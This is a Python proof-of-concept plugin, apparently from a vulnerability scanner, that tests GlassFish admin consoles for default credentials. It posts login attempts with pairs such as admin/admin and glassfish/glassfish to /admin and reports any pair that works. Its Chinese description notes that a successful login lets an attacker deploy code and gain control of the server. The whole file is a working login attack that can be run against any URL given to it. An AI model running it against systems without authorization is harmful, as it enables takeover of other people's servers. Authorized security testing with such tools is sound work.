#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
from urllib.parse import urlparse

def get_plugin_info():
    plugin_info = {
        "name": "Glassfish弱口令",
        "desc": "攻击者通过此漏洞可以登陆管理控制台，通过部署功能可直接获取服务器权限。",
        "grade": "高",
        "type": "web",
        "keyword": "tag:glassfish",
    }
    return plugin_info
    
def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    user_list = ["glassfish", "admin"]
    passwd_list = ["admin", "{user}"]
    flag_list = ['Just refresh the page... login will take over', 'GlassFish Console - Common Tasks',
                 '/resource/common/js/adminjsf.js">', 'Admin Console</title>', 'src="/homePage.jsf"',
                 'src="/header.jsf"', 'src="/index.jsf"', '<title>Common Tasks</title>', 'title="Logout from GlassFish']
    error_i=0
    for user in user_list:
        for passwd in passwd_list:
            passwd = passwd.replace("{user}", user)
            try:
                r = requests.post(
                    url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/admin', 
                    data=f'j_username={user}&j_password={passwd}&loginButton=Login&loginButton.DisabledHiddenField=true', 
                    timeout=timeout,
                    verify=False,
                    headers=headers)
            except requests.exceptions.ConnectionError:
                return
            except requests.HTTPError:
                return
            except:
                error_i += 1
                if error_i >= 3:
                    return
                continue
            for flag in flag_list:
                if flag in r.text:
                    return f'{arg}\t{user}/{passwd}'
    return False

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  
